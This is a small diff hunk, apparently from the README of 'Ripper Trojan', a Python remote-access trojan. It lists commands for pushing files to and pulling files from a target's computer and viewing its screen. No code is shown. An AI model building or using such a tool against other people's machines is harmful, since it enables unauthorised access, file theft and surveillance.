@@ -2,7 +2,7 @@
   Ripper Trojan a complete trojan written in python with multifunctionality, useful and easy-to-use commands.
   #
   Commands:
-  #
+  
    ✔️ send <file name> --> send files to target computer
    ✔️ get <file name> --> download files from the target's computer
    ✔️ screen --> show the target screen
